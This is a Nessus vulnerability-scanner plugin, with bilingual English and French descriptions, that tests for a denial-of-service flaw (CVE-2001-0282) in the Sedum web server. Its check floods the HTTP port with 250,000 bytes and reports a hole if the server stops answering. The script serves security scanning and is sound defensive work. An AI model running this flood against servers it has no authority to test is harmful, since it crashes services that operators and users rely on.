
#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10637);
 script_bugtraq_id(2413);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2001-0282");
 
 name["english"] = "Sedum DoS";
 name["francais"] = "Sedum DoS";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible
to make the remote web server crash
by sending it too much data.

An attacker may use this flaw to
prevent this host from fulfilling
its role

Solution : contact your vendor for a patch
Risk factor : High";


 desc["francais"] = "Il s'est avéré
possible de faire planter le
serveur web distant en envoyant trop
de données sur ce port.

Un pirate peut utiliser cette
attaque pour empecher cette machine
de remplir son role de serveur web.

Solution : contactez le vendeur pour un patch.
Facteur de risque : Sérieux";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote web server";
 summary["francais"] = "Plante le serveur web distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);

 
 exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 { 
  req = crap(250000);
  send(socket:soc, data:req);
  close(soc);
  sleep(2);

  soc2 = open_sock_tcp(port);
  if(!soc2)security_hole(port);
 }
}
